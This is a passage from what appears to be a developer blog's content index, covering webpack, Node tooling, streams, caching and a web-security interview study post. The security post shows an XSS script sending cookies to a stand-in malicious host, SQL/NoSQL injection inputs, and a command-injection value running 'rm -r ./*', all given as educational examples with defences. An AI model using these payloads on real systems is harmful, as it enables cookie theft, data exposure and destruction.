sideEffectValue是被改变的结果\n\n看一下webpack编译后的结果，es6编译后的代码是在同一个函数作用域下面的，对于sideEffectValue这个export，引用的地方是直接使用的:\n\n但是CommonJS编译后的代码，必须首先挂在一个{}上，然后才能引用。这里的dependency和module.exports是同一个引用地址。\n\n好了，这样就很明显了，webpack打包后他们之间在引用值上的区别，就是因为CommonJS多了一个module.exports = {}作为挂载对象而产生的直接引用值对象上的区别。\n\nCommonJS其实加载的是一个对象，这个对象只有在脚本运行时才会生成，而且只会生成一次，所以是运行时加载。\n\n从结果中也可以看到，对于引入了但是没有使用的模块，CommonJS执行了模块全文，但是es6模块没有。\n\n现在我们把package.json里的sideEffects设为true，执行结果是es6也和CommonJS一样，es6模块也执行了全文。\n\n这就是webpack的tree shaking, 其实scope hosting也是基于es6的静态分析。\n\nwebpack异步加载\n\n从异步加载的源代码编译成后的目标代码中，我们可以看到webpack_require.e这个相比其他目标代码多出来的方法(其实从注释中就可以看出来), 添加一个``标签，然后用jsonp的方式加载：\n\n在被拆分出的代码块中可以看到，通过全局对象webpackJsonp推入加载新的模块:\n\nReference\n","title":"JS的模块化和不同模块规范在webpack中的实现"},"node_debugger.html":{"content":"Node Dubug\n\n本文的项目demo：\n\n众所周知，跑在node平台上的js是解释型的语言，因此断点调试必须要基于node的debug protocol，而非直接基于cpu的指令集。\n\n较为主流的debug方式如下：\n\nconsole.log\n\n兄弟们无须多言，对前端人员非常友好，与浏览器中调试一样，在代码中需要调试的地方直接写上，只是展示形式有所不同，在Node中是在终端命令行中打印。\n\n这是最简单快速的调试手段，缺点也很明显，对原有代码入侵较大，在特定场景中使用较局限，而且不是同步的。\n\nv8 Debugger Protocol\n\nnode-inspector即是基于此protocol。但是已经被v8 Inspector Protocol取代。\n\nv8 Inspector Protocol\n\nnode提供了v8 Inspector Protocol，可以使用第三方的 Client/IDE 等监测和介入 Node(v8) 运行过程，进行调试。通过 websocket与 Client/IDE 交互，同时基于 Chrome/Chromium 浏览器的 devtools 提供了图形化的调试界面。\n\nyarn legacy\nopen http://localhost:5858/json/list\n打开devtoolsFrontendUrl\n\nVScode支持\n\n使用浏览器调试的确更符合前端的使用习惯，但是直接使用ide调试显然才是更高级的享受。这里用vscode做例子。\n\n打开JavaScript Debug Terminal (新打开一个vscode window必须要重新打开一个新的jdt)\nattach breakpoints\nyarn vscode\n\n配合nodemon更显丝滑。\n\nTypescript的node调试\n\n针对ts的调试，有两种方案。\n\nsourceMap的方式\n\n在tsconfig.json上设置\"sourceMap\": true。\n\nyarn ts\n\n使用ts-node\n\nts-node已经集成了debug的功能，通过ts-node可以直接在vscode上调试。\n\n打开JavaScript Debug Terminal (新打开一个vscode window必须要重新打开一个新的jdt)\nattach breakpoints\nyarn tsnode\n\nAddition: 命令行的动态ts引入\n\n#! /usr/bin/env node\nrequire('ts-node').register({\n  typeCheck: true,\n  files: true,\n});\nrequire('./bin');\n\nReference\n","title":"Node Dubug"},"package_manager.html":{"content":"Node Package Manager\n\n除了npm，node还有很多其他的包管理工具。\n\n因为node的模块系统用起来不那么舒服，所以才会出现了那么多包管理工具，八仙过海，各显神通。就连node的创作者都因为对node的模块系统忍无可忍, 才去另起炉灶了deno.\n\n究其原因，还是因为node的递归向上查找模块机制，导致了包管理复杂度的急剧升高。\n\nBefore Reading\n\n本文的demo已经上传至git仓库package-manager-playground. Demo使用了corepack, 如果你使用的node版本在16.9.0以上，那么不用额外安装yarn和pnpm, 同时只能使用指定的包管理工具.\n\n先了解下node的模块管理机制, hard link和symlink之间的区别, 等基础知识, 可以更顺畅的阅读本文.\n\nSore Points\n\n对于现在基于npm/yarn的node模块安装, 个人感觉到最痛的点有以下这么几个。\n\nPhantom Dependencies\n\n由于现在npm和yarn的flat策略，是可以在非显式声明的情况下去引入某些包的. 比如这个项目不存在body-parser依赖声明，但是因为express包含了body-parser的依赖，所以可以直接引用body-parser.\n\n虽然有时候这种特性非常方便，比如在满足版本的情况下，可以少添加一个包，甚至可以避免下面要说的doppelgangers问题，但是这毕竟是一种不规范的做法, 容易导致迷惑.\n\n最糟糕的是, 很多非常流行的包, 由于对于运行(npm和yarn安装的前提下)并没有什么影响或者因为疏忽, 就使用了这种引用方式.\n\nDoppelgangers\n\n做了一个demo, 在npm上发布了四个奇怪的包，罪过罪过.....\n\n可以看到，依赖关系是这样的：\n\na => b => d@2.0\na => c => d@2.0\na => d@1.0\n\n最终，利用yarn装包后文件树是这样的：\n\n可以看到，d的v2.0被安装了两次，尽管做了flat的算法，仍然有冗余的依赖安装。\n\nDependencies Redundancy\n\n这个也是老生常谈的问题，随着项目增多，node_modules碎片化分布, 占用内存的体积急剧变大，256g的开发机真的已经落后于时代了....\n\ncargo\n\n没有对比就没有伤害，可以看一下rust的包管理工具cargo是怎么做的.\n\n感觉rust和node的包管理, 在某些方面是有相似度的, 比如第三方都是提供源码然后本地统一编译, 统一的包管理等等.\n\n先git clone git@github.com:Bert0324/package-manager-playground.git, 然后分别进入/cargo和/modules/cargorenamedemo, 可以直观的看到文件结构.\n\nGlobal Store\n\ncargo不会在每个项目中都安装依赖, 而是会在~/.cargo目录中安装第三方包.\n\n运行cargo install和运行npm install也有区别, cargo install会在~/.cargo中安装对应依赖, 然后项目的依赖必须手动在Cargo.toml中添加, 同样遵循semver规范. 当cargo build和cargo run时会自动安装未安装的依赖.\n\n由此, 避免了node中依赖碎片化的管理, 节省了内存空间.\n\nDisable Implicit Dependencies\n\n类似其他的模块管理机制, rust中禁止隐式依赖, 即使是第三方包间接依赖的包, 只要没有显式的安装, 就是无法在项目中使用的.\n\nRename Mod\n\n类似npm alias的能力.\n\nrust支持相同模块的多版本共存, 参考此Cargo.toml.\n\nWhy Cargo can\n\n可以看到, rust的模块管理系统既兼顾了简洁和功能的丰富(反例是java全局class注册, 不方便简单的支持模块多版本), 又不至于过高的复杂度.\n\n为什么rust可以, node就做的这么缺一口气呢? 感觉还是因为node的包引用机制: 递归向上查找模块.\n\n相比起来, node模块机制虽然简单直观易上手, 而且在使用初期用户感知很少, 但是是一个扩展性不那么强的设计.\n\npnpm\n\n虽然node这么烂了，但是毕竟大家都在用了(而且用的竟然还有些顺手了), 所以出现了很多patch的方案.\n\n其中pnpm比较新和成熟, 包括cnpm之类的方案也和其相似度很高, 可以作为一个典型去研究一下, 可以figure out他是去怎么解决这些痛点的.\n\n先git clone git@github.com:Bert0324/package-manager-playground.git, 然后分别进入/pnpm和/pnpm2并npm run bootstrap, 可以重复下面的试验.\n\nGlobal Store => hard link\n\n实现全局存储, pnpm的做法很有意思. 他不会和cargo一样, 去创建一个全局的~/.pnpm, 而是通过hard link去共享各个项目.pnpm内的模块依赖, 从而减小对内存的占用.\n\n举一个比较直观的栗子, 在demo中, /pnpm和/pnpm2这两个项目中都依赖了同一个库\"body-parser\": \"1.19.0\".\n\n然后在/pnpm/nodemodules/.pnpm/body-parser@1.19.0/nodemodules/body-parser这个目录下运行ls -alFi, 可以看到:\n\n也在/pnpm2/nodemodules/.pnpm/body-parser@1.19.0/nodemodules/body-parser这个目录下运行ls -alFi, 可以看到:\n\n可以很直观的看到, 这两个包里的inode number是一模一样的, 说明是同一份文件的两份硬链接.\n\nDependency Link  => symlink\n\n在demo中, /pnpm这个项目依赖了express这个依赖, 如果去引用body-parser, 就会报错. 那么, pnpm究竟是如何去做这件事的呢?\n\n首先, 进入/pnpm/node_modules, 然后ls -alFi, 可以看到:\n\n其他包是不存在/pnpm/node_modules这个目录下的, 自然链接不到.\n\n然后也可以看到, express这个包是被symlink去了/pnpm/nodemodules/.pnpm/express@4.17.1/nodemodules/express这个目录下, 那么express是怎么去找到自己的依赖的呢? 继续进入/pnpm/nodemodules/.pnpm/express@4.17.1/nodemodules这个目录下, 然后ls -alFi, 可以看到:\n\n除了自己, 都被symlink到了/pnpm/node_modules/.pnpm这个目录下.\n\n举一个比较直观的栗子, 对于一个经典的依赖关系:\n\na => b\n\n他通过pnpm建立起的文件拓扑结构, 画出来有点乱(其实真的也有点复杂), 如下:\n\n所以本质上, pnpm和npm/yarn是没有区别的, 也是会flat后放在.pnpm中, 但是他多做的一点是把文件通过symlink串联起来.\n\n比较相似的是, yarn的workspace也是用symlink去统一依赖的, 可以看此yarn源码. 还有cnpm, 也是用类似的方案.\n\nWhen using pnpm\n\n特别值得一提的是, pnpm的这种方式, 如果依赖的包写法不规范, 隐式依赖了一些包, 会导致依赖查询不到而报错. 那么就只能用npm/yarn去安装, 或者为pnpm cli加上--shamefully-hoist.\n\n此外, symlink的方式会导致一些IDE索引很久, 占用cpu, 在此特别推荐vscode作为配合.\n\nThinking\n\n时至今日, node都已经可以用corepack去指定包管理工具了, npm的地位已经不那么官方了. 如果node可以有更好的包管理方案, 意味着更小的包体积, 更简单的tree shaking逻辑, 那么对基于js开发的前后端的开发体验和用户体验, 都会有很大的提升.\n\n但是其实, 个人觉得更科学的是deno http import和go http import的方式, 更加符合一个前端的直觉.\n\n同时, 可以思考用 esm + http import的方式, 把前端从webpack和node_modules中拯救出来, 充分利用类似skypack这类cdn的缓存, 对于整体的缓存率的提升会有很大的提升的.\n\nReference\n\npnpm博客:\nrushjs官网:\ncargo官网:\n","title":"Node Package Manager"},"stream_buffer.html":{"content":"Stream and Buffer\n\nWhat is Buffer\n\nFrom the definition from Data Buffer, we can see, data buffer is a real\nphysical storage medium.\n\nA majority of buffers are implemented in software, which typically use the faster RAM to store temporary data, due to the\nmuch faster access time compared with hard disk drives.\n\nThe main purpose including:\n\nInterconnecting two digital circuits operating at different rates\n\nHolding data for later use,\n\nAllowing timing corrections to be made on a data stream,\n\nCollecting binary data bits into groups that can then be operated on as a unit,\n\nDelaying the transit time of a signal in order to allow other operations to occur.\n\nWhat is Stream\n\nApprarently, if we can understand the meaning of existence of Buffer, it's easier to understand Stream.\n\na data stream is a sequence of digitally encoded coherent signals (packets of data or data packets) used to transmit or receive information that is in the process of being transmitted.\n\nIf a file is too big and we cannot read it (load it to memory at one time), the data will be saved to Buffer area first, and then, via Stream, we can read the data in order.\n\nBuffer and Stream in Node.js\n\nBuffer API\n\n// create Buffer\nconst buf1 = Buffer.alloc(size, value); // return a hexadecimal byte\n// create Buffer from String\nconst buf2 = Buffer.from(\"hello\"); //\n\n// String to Buffer\nbuf2.toString(); // directlt return the string content: 'hello'\nbuf2.toString(\"hex\"); // return a hexadecimal string: '68656c6c6f'\n\nTips: Instances of the Buffer class are similar to arrays of integers from 0 to 255 (other integers are coerced to this range by & 255 operation) but correspond to fixed-sized, raw memory allocations outside the V8 heap. The size of the Buffer is established when it is created and cannot be changed.\n\nUse Buffer in Node.js\n\nIn Node.js Stream, we don't need to directly operate Buffer as Node.js has package it in Stream class like as below:\n\nconst inputStream = fs.createReadStream(\"input.txt\");\nconst outputStream = fs.createWriteStream(\"output.txt\");\ninputStream.pipe(outputStream);\n\nIn crypto, buffer can be used to be filled by bytes.\n\nBesides, in Http server, using Buffer to transfer data is more efficient than String:\n\nres.end(Buffer.from(\"{a:1}\"));\nres.end(\"{a:1}\");\n\nStream\n\nStreams can be readable, writable, or both. All streams are instances of EventEmitter, indluding Writable, Readable, Duplex and Transform.\n\ncreateWriteStream\n\nconst writeS = fs.createWriteStream(\"output.txt\");\nwriteS.once(\"open\", fd => {\n  for (let i = 0; i  {\n  content += chunk;\n});\nreadS.on(\"end\", chunk => {\n  if (!chunk) {\n    console.log(content);\n  }\n});\n\nIn addition, pipe event can be used to access stream, in order to such as compress files:\n\nconst fs = require(\"fs\");\nconst r = fs.createReadStream(\"file.txt\");\nconst z = zlib.createGzip();\nconst w = fs.createWriteStream(\"file.txt.gz\");\nr.pipe(z).pipe(w);\n\nDuplex streams are streams that implement both the Readable and Writable interfaces.\n\nTransform streams are Duplex streams where the output is in some way related to the input. Like all Duplex streams, Transform streams implement both the Readable and Writable interfaces.\n\nWhen operating large size files, obviously, Stream is the better choice compared with fs.readFile.\n\nReference\n\nMore official information can be seen at document.\n","title":"Stream and Buffer"},"utility_functions.html":{"content":"Utility Functions\n\nWait Until\n\nThis function is to wait until the callback retuning a valid value.\n\nimport { setTimeout as wait } from 'timers/promises';\n\n/**\n wait until\n @param callback\n @param options\n @returns\n */\nexport const waitUntil = (\n  callback: () => Promise | T,\n  options?: {\n    /**\n     timeout\n     @default 10s\n     */\n    timeout?: number;\n    /**\n     interval\n     @default 300ms\n     */\n    interval?: number;\n    /**\n     verify the returned value is valid\n     @default truthy\n     */\n    verify?: (v?: T) => boolean;\n    /**\n     limit the callback's running times\n     @default Infinity\n     */\n    maxTimes?: number;\n  },\n) => {\n  const { timeout, maxTimes, verify, interval } = options || {};\n  let hasTimeout = false;\n  const limit = maxTimes || Infinity;\n  let times = 0;\n  let v: T;\n  let e: Error;\n  return new Promise(async (resolve, reject) => {\n    const handler = setTimeout(() => {\n      hasTimeout = true;\n      e = new Error(timeout: ${(timeout || 10000) / 1000}s);\n      reject(e);\n    }, timeout || 10000);\n    while (!hasTimeout && !v && !e) {\n      if (times >= limit) {\n        e = new Error(max times: ${times});\n        break;\n      }\n      times += 1;\n      try {\n        v = await callback();\n      } catch (_e) {\n        e = _e;\n        break;\n      }\n      if (verify?.(v) || !!v) {\n        clearTimeout(handler);\n        return resolve(v);\n      }\n      await wait(interval || 300);\n    }\n    if (e) {\n      clearTimeout(handler);\n      return reject(e);\n    }\n    return resolve(v);\n  });\n};\n\nuseLongPull\n\nRunning a long pull task based on the React Hook.\n\nimport { useEffect, useCallback, useRef } from 'react';\n\n/**\n start a long pull task\n - callback changed/clear/stop => stop the task\n - only one task at the same time\n @param callback\n @returns [start, stop]\n */\nexport const useLongPull = (callback: (e?: Error, v?: T) => T | undefined) => {\n  const ref = useRef(false);\n  const timer = useRef(0);\n\n  const continuePull = useCallback((cp: boolean) => {\n    ref.current = cp;\n  }, []);\n\n  const stop = useCallback(() => continuePull(false), [continuePull]);\n\n  const pull = useCallback(\n    (flag: number) => {\n      const fn = async (__e?: Error, v?: T) => {\n        let res;\n        let e;\n        try {\n          res = await callback(__e, v);\n        } catch (_e) {\n          e = _e;\n        }\n        if (ref.current && flag === timer.current) queueMicrotask(() => void fn(e, res));\n      };\n      return fn();\n    },\n    [callback],\n  );\n\n  const start = useCallback(() => {\n    timer.current += 1;\n    continuePull(true);\n    pull(timer.current);\n  }, [pull, continuePull]);\n\n  useEffect(() => {\n    stop();\n    return stop;\n  }, [stop]);\n\n  return [start, stop] as const;\n};\n\nXOR\n\nLimit Concurrent Volume\n\nThis class is used to register a task and fetch its result asynchronously.\n\nenum TaskStatus {\n  waiting,\n  running,\n  success,\n  fail\n}\n\nexport class TaskService {\n  /**\n   current tasks queue\n   */\n  private tasks: {\n    id: string;\n    status: TaskStatus;\n    task: () => any;\n    ret?: any;\n  }[] = [];\n  /**\n   max concurrent volume\n   */\n  private maxConcurrent: number;\n  /**\n   if remove the finished task\n   */\n  private removeFinished = true;\n\n  constructor(maxConcurrent: number, removeFinished?: boolean) {\n    this.maxConcurrent = maxConcurrent;\n    if (removeFinished !== undefined) this.removeFinished = removeFinished;\n  }\n\n  /**\n   execute a waiting task\n   */\n  private execute() {\n    setTimeout(async () => {\n      if (this.getCurrentConcurrentVolume()  status === TaskStatus.waiting).pop();\n        if (item) {\n          item.status = TaskStatus.running;\n          try {\n            const ret = await item.task();\n            item.ret = ret;\n            item.status = TaskStatus.success;\n          } catch (e) {\n            item.ret = e;\n            item.status = TaskStatus.fail;\n          }\n          this.execute();\n        }\n      }\n    });\n  }\n\n  /**\n   get current concurrent volume\n   @returns\n   */\n  getCurrentConcurrentVolume() {\n    return this.tasks.filter(({ status }) => status === TaskStatus.running).length;\n  }\n\n  /**\n   register a task\n   @param data\n   @param taskId\n   @returns\n   */\n  register any)>(task: T) {\n    const id = ${Math.random()};\n    this.tasks.unshift({\n      id,\n      task,\n      status: TaskStatus.waiting,\n    });\n    this.execute();\n    return id;\n  }\n\n  /**\n   search task result\n   - if it has been finished, remove it\n   @param id\n   */\n  fetch(id: string) {\n    const index = this.tasks.findIndex(item => item.id === id);\n    if (index  void, interval = 1000) => {\n  let timer = 0;\n  let handler: number | undefined;\n  let fn: ((last?: number | undefined) => number) | undefined = (last?: number) =>\n    requestAnimationFrame((t) => {\n      if (!last || t - last > interval) {\n        if (last) timer += ((t - last) / interval) >> 0;\n        else timer += 1;\n        try {\n          cb(timer);\n        } catch (e) {\n          console.log('callback error in withTimeChange:', e);\n        }\n        handler = fn?.(t);\n      } else {\n        handler = fn?.(last);\n      }\n    });\n  return [\n    () => {\n      handler = fn?.();\n    },\n    () => {\n      if (handler !== undefined) cancelAnimationFrame(handler);\n      fn = undefined;\n    },\n  ] as const;\n};\n","title":"Utility Functions"},"smart_points.html":{"content":"Smart Points in Rust\n\nBox\n\nRc\n\nRef\n\nborrow, borrow_mot and take\n\nReference\n","title":"Smart Points in Rust"},"request.html":{"content":"Http Request\n\nXMLHttpRequest Basic Usage\n\nconst request = new XMLHttpRequest();\nrequest.addEventListener(\"load\", () => console.log(request.responseText));\nrequest.open(\"GET\", \"https://www.google.com\");\nrequest.send();\n\nfetch Basic Usage\n\nget ReadableStream:\n\nconst data = await (await fetch('https://www.google.com')).text();\n\npost data:\n\nconst postData = (url, data, encodeType) => fetch(url, {\n\tbody: JSON.stringify(data),\n\tcache: 'no-cache',\n\tcredentials: 'same-origin',\n\theaders: {\n\t\t'content-type': encodeType\n\t},\n\tmethod: 'POST',\n\tmode: 'cors',\n\tredirect: 'follow',\n\treferrer: 'no-referrer',\n});\n\nAbort Request\n\nAborting request by AbortController with signal.\n\nconst { signal, abort } = new AbortController();\n\nconst request = async (url: string, callback: Function) => {\n    const res = await fetch(url, { signal });\n    callback(res);\n};\n\nrequest();\nabort();    // request is aborted\n\n4 POST data encoded ways\n\nWe can set post data format method by Content-Type in http request headers, or change `'s enctype` attribute.\n\napplication/x-www-form-urlencoded\n\nAs the name suggests, it encoded data like url:\n\na=1&b=2\n\nThis is ``'s default encode type.\n\napplication/json\n\nIt will serialize contents as JSON:\n\n{ \"a\": 1, \"b\": 2 }\n\nmultipart/form-data\n\nIt will generate a boundary in http message started by ------, end by \\n, contents are recorded as key-value. Moreover, in the boundary Content-Type can be set as image/png to save images or files.\n\nLike as below:\n\ntext/xml\n\nIt will send plain content as text, such as using XML to transfer data.\n\nSet Max Number of Concurrency\n\nconst request = async (urls: string[], maxNumber: number, callback: Function) => {\n    const data = {\n        queue: [...urls],\n        count: 0,\n    };\n    const handler = async () => {\n        switch (true) {\n            case data.queue.length === 0:\n                callback();\n                break;\n            case data.count\n","title":"Http Request"},"web_cache.html":{"content":"Web Cache\n\nRemote Resource Cache\n\nCaching is one of the most important way to improve the FP response time of Web Applications.\n\nNowadays, We have multiple ways to control it.\n\nTraditionally, we can control web caching by Http caching.\n\nThe order of a request passing web cache methods is as below:\n\nSW caching\n\nAlong with emergence of ES6, SW is a newer and more powerful way to do it, if ignoring its compatibility.\n\nIt can proxy whole requests to check whether needs to update by caches, see more in my blog Service Worker.\n\nHttp caching\n\nHttp caching is to use Http headers to control browser resource's cache. There are some steps how browsers to do it:\n\nsearch in Browser cache\n\nFirst, the browser will find in its cache by the file's name and cache mark.\n\nIf found, browser will directly return the file, if not, browser send a request to the server.\n\nFor example, Chrome will get the cache from the memory or disk like below:\n\nThere are some headers can be cache mark:\n\nExpires\n\nFrom Http/1.0.\n\nThe Expires header contains the date/time after which the response is considered stale.\n\nInvalid dates, like the value 0, represent a date in the past and mean that the resource is already expired.\n\nIf there is a Cache-Control header with the \"max-age\" or \"s-max-age\" directive in the response, the Expires header is ignored.\n\nCache-Control\n\nFrom Http/1.1.\n\nThe Cache-Control general-header field is used to specify directives for caching mechanisms in both requests and responses.\n\nCaching directives are unidirectional, meaning that a given directive in a request is not implying that the same directive is to be given in the response.\n\nSee document in MDN.\n\ncheck cache with server\n\nIf the browser can find the file, but its cache mark shows it has already expired, the browser will send a request with the cache information of the resource.\n\nThe server will make the decision whether to use cached resource.\n\nIf the cache has already expired, the server will response 200 with new resource. In contrast, if it is not modified, the server will response 304.\n\nAnd how do the server make the logical judgement to whether the cache is expired, the http headers it used is as below:\n\nLast-Modified and If-Modified-Since\n\nLast-Modified indicates the last modified time of the resource, the server will send the header with the response.\n\nAnd When the next time the client decide to request the resource again, If-Modified-Since will be sent with the request. The value is the same as Last-Modified.\n\nAn example from facebook static resource site:\n\nETag and If-None-Match\n\nAlthough Last-Modified and If-Modified-Since is able to cover most of cache situations, they have limits as below:\n\n    When the resource content has been modified, but we don't want the client to GET it again.\n    The modified time accuracy is under second, as Last-Modified can only accurate to second.\n    When the server cannot get the modified time of the resource\n\nIn this way, we can use ETag and If-None-Match.\n\nETag is relative to files' content, such as content hash, or relative to its modified time. And in next request, its value will be sent in If-None-Match.\n\nCDN\n\nThe full name is Content Delivery Network. It can disperse traffic from the source server and optimize network load.\n\nThere are its steps:\n\nFirst, keep statistics of the access logs of the original domain name to get the addresses of frequently-accessed\nimages , and hand over the addresses to the CDN service provider.\n\nLet the CDN service provider capture the resources of the 200,000 addresses as a warm-up.\n\nAfter the warm-up, we replace original ip address to CDN server address, and conduct CNAME resolution\nto the provided domain name address of the CDN server.\n\nTest whether the images under CDN server which can be cached by the CDN using the wgettool.\n\nIf the cache is okay through testing, we then switch part of the traffic to CDN server.\n\nSee a reference:\n\nLocal Cache\n\nkey-value storage\n\nIf we want to save some of key-value data, localStorage and sessionStorage can be our choices. They both have get and set function for saving and getting data.\n\nlocalStorage\n\nThe localStorage can save string data permanently, its capacity is about 5MB.\n\nsessionStorage\n\nThe sessionStorage can save data until the tab is closed, its capacity is about 5MB.\n\nIndexedDB\n\nIndexedDB is a large-scale, NoSQL storage system. It lets you store just about anything in the user's browser.\n\nCompared to localStorage, IndexedDB:\n\n    mostly asynchronous\n    supported to access the data from same domain\n    can save an object instead of only string\n    its capacity is about 250MB, or without limitation\n\ncookie\n\ncookie also can save some key-value data, although it is not a good way.\n","title":"Web Cache"},"web_security.html":{"content":"When I was in an interview of Tencent, the interviewer asked me how much Web security points you know?\n\nI found I don't have a systemic knowledge network about it.\n\nSo, there are some points I collected for memory.\n\nXSS\n\nIts full name is Cross Site Script. But its abbreviation is CSS, which is the same as Cascading\nStyle Sheets. SO....it becomes XSS.\n\nXSS is a code injection attack that allows an attacker to execute malicious\nJavaScript in another user's browser.\n\nIt includes these 3 types:\n\nPersistent XSS\n\nNormally happened in those websites users can post their input. The malicious code will be saved in\nthe database, therefore, each user who opened the page will be attacked.\n\nFor example, if there is a input tag, user can post their own content by it. Other users can open this page see\nthe content.\n\nUsers content\n\nBut, if someone input a string as below:\n\nthe final result may as:\n\nAnd the script like as below:\n\nvar img = document.createElement('img');\nimg.src = 'http://www.malicious-site.com/save-cookie?cookie=' + document.cookie;\ndocument.body.appendChild(img);\n\nIn this way, the malicious site can get the cookie of each user who open the page.\n\nTo prevent it, I think the best way is to filter users' post content.\n\nReflected XSS\n\nIts principle is the same as Persistent XSS, attacker try to get user's personal information\nby insert HTML tag.\n\nFor example, there is a error page who shows error messages from the server by url, like\n\nhttp://www.some-page.com/error?message=Page%20not%20found\n\nthe content in message will be showed in HTML, like:\n\nPage not found\n\nIf an attack inputs an URL like\n\nhttp://www.some-page.com/error?message=\n\nThe final HTML will become:\n\nNext processes will be the same as Persistent XSS.\n\nDOM-based XSS\n\nAccording to some of articles on the Internet, Dom-based XSS is a special Reflected XSS.\n\nIn my understanding, DOM-based XSS triggers attack via modifying DOM content, such as\ninnerHTML, which is the same as Reflected XSS.\n\nBut, their difference is that Dom-based XSS won't leave a mark in the server side, compared to Reflected XSS\nwhich will leave a url record in the server request log.\n\nThere is a simple example updated from last example of Reflected XSS:\n\nwe can use a new url like:\n\nhttp://www.some-page.com/error?message=Page%20not%20found#%3Cscript%20src%3D%22http%3A%2F%2Fwww.malicious-site.com%2Fcode%22%3E%3C%2Fscript%3E\n\nThe biggest difference is that we can use location.hash to inject malicious code to the page, which won't show the url after # in the\nserver side. In this way, it is more difficult for website maintainers to find the attack by checking request log.\n\nSo the biggest difference among Reflected XSS and DOM-based XSS is that DOM-based XSS cannot be found in the server side, it is\npure attack happened on client side.\n\nHow to prevent XSS\n\nI think the best way to prevent XSS is to forbid users to change HTML content, but this is difficult especially for those websites\nbased on UGC.\n\nSo, the feasible way is to filter url's parameters and UGC, such as some of special chars, \\/*;'.\n\nThere are some alternative chars to replace sensitive chars in JS, such as \\u003c and \\x3c to replace ``.\n\nCSRF\n\nIts full name is Cross Site Request Forgery, abbreviation is CSRF.\n\nLike XSS, it may steal users' cookie.\n\nBut their difference is that XSS is to make use of the trust for users, CSRF is to pretend as the user.\n\nFor example, there is a request\n\nhttp://www.money.com?account=sender&amount=10000&for=receiver\n\nto transfer money while the user was already logined and cookie was saved. If the user go to a malicious website which add a tag like\n\nthe cookie will be with this request because of same domain.\n\nIn this way, the hacker does not need to get the user's cookie when attacking.\n\nThere are some ways to protect:\n\nCheck HTTP Referer\n\nThe most simple way is to check HTTP Referer, which can identify the original website of\nthe request.\n\nIn Node.JS, for example:\n\napp.use(req => {\n    if (req.headers.referer === 'http://legal-site.com'){\n        //do something\n    } else {\n        //reject request\n    }\n});\n\nBut, in some of old version chrome, such as IE6 or FF2, there are ways to artificially modify\nHTTP Referer. Besides, users may forbid browser to offer HTTP Referer.\n\nToken\n\nCSRF is to forge normal real user request. So, if we can use create a token that the attacker cannot\nget, we can avoid CSRF.\n\nFor example, we can calculate post message's hash value in front side, and set it in the url or http header,\nwhen server is processing the request, it can check the token, if the token is not right, refuse to response.\n\nInjection Attack\n\nInjection attacks refer to a broad class of attack vectors. In an injection attack, an attacker supplies untrusted\ninput to a program. This input gets processed by an interpreter as part of a command or query. In turn, this alters\nthe execution of that program.\n\nIt includes some of typical types as below:\n\nSQL Injection\n\nSQL Injection may execute malicious SQL statements in the database, such as getting whole data of the table or specific\nuser information.\n\nNumber Injection\n\nFor example, if there is a API to GET user's information: www.example.com?id=1,\nthe SQL statement may be:\n\nSELECT * FROM users WHERE id=1\n\nWhen we input www.example.com?id=1 OR 1=1, , the statement will become\n\nSELECT * FROM Users WHERE id=1 OR 1=1\n\nAs a result, attacker can get whole table information.\n\nString Injection\n\nOr, if there is a API for POST to login, the parameters include username and password. The SQL statement may like\n\nSELECT * FROM users WHERE username='user' AND password='password'\n\nAttacker may try to make the part of statement after username become comments to directly get users' information without password.\n\nFor example, if the user input is user' #  and password as password', the final statement will become:\n\nSELECT * FROM users WHERE username='user' # ' AND password='password''\n\nSimilarly, input user as user' --  also work as:\n\nSELECT * FROM users WHERE username='user' -- ' AND password='password'\n\nThese two statements are both the same as:\n\nSELECT * FROM users WHERE username='user'\n\nNoSQL Injection\n\nLike SQL, NoSQL database like MongoDB can also be injected.\n\nLike the same example in SQL Injection, if the application uses NoSQL database such as Mongodb,\nthe statement may be:\n\ndb.users.find({username:user, password=password})\n\nIf someone's JSON input object likes:\n\n{\n  \"username\": \"user\",\n  \"password\": {$gt: \"\"}\n}\n\nIn MongoDB, $gt selects those documents where the value of the field is greater than (i.e. >) the specified value.\nThus above statement compares password in database with empty string for greatness, which returns true.\n\nThe same results can be achieved using other comparison operator such as $ne.\n\nCommand Injection\n\nLike SQL Injection and NoSQL Injection, Command Injection will also run malicious code because of a user's input.\n\nFor example, if there is an API allows users to compress specific file in the server:\n\napp.use.get('/gzip', (req, res)=>{\n    childprocess.exec(exec ${req.query.filepath}, (err, data)=>{\n        if (err){\n            res.send(err.toString());\n        } else {\n            res.send(data.toString());\n        }\n    })\n});\n\nIf some one input an URL like:\n\nwww.example.com/gzip?file_path=file.txt\\rm -r ./*\n\nIt may be a disaster.\n\nHow to prevent\n\nThere are some tips:\n\nuse prepared statements instead of building dynamic queries using string concatenation.\n\nValidate inputs to detect malicious values.\n\nTo minimize the potential damage of a successful injection attack, do not assign DBA or admin type access rights\nto your application accounts. Similarly minimize the privileges of the operating system account that the database process runs under.\n\nDoS Attack\n\nIn computing, a denial-of-service attack (DoS attack) is a cyber-attack in which the perpetrator seeks to make a machine\nor network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet.\n\nincludes:\n\nSYN Flood\n\nICMP Flood\n\nUDP Flood\n\nCompared to DoS attack, A distributed denial-of-service (DDoS) attack occurs when multiple systems flood the bandwidth\nor resources of a targeted system, usually one or more web servers. Such an attack is often the result of multiple\ncompromised systems (for example, a botnet) flooding the targeted system with traffic.","title":"When I was in an interview of Tencent, the interviewer asked me how much Web security points you know?"},"performance.html":{"content":"Web Performance\n\n从why, how, what三个纬度去讨论下前端性能监控这件事。\n\nWhy\n\n全球趋势\n\n在讨论之前，我们可以来看一下，一些制约前端性能的因素，在全球的一些情况：\n\n网速\n\n可以看到，mobile端的网速上升的比固定宽带的快很多，但是从绝对值上来说，仍然是很慢的，从很长的一个时间段上来说，mobile端的加载速度，仍然是比起来相对慢的。\n\n文件大小\n\n从中可以看到，web的静态资源体积是总体一直在上涨的，其中js的上涨速度尤其的快。\n\n首屏时间\n\n可以参考这个报告：\n\n可见，即使文件体积变大了，全球网站的响应速度仍然是越来越快的，如果跟不上这个发展，那我们的网站表现的就会尤其扎眼。\n\n性能和留住用户的关系\n\n更快的打开速度和用户流量和注册率的关系\n\n   Pinterest reduced perceived wait times by 40% and this increased search engine traffic and sign-ups by 15%.\n   COOK reduced average page load time by 850 milliseconds which increased conversions by 7%, decreased bounce rates by 7%, and increased pages per session by 10%.\n   The BBC found they lost an additional 10% of users for every additional second their site took to load.\n\n和用户转换率的关系\n\n   For Mobify, every 100ms decrease in homepage load speed worked out to a 1.11% increase in session-based conversion\n   AutoAnything reduced page load time by half, they saw a boost of 12% to 13% in sales.\n   Retailer Furniture Village audited their site speed and 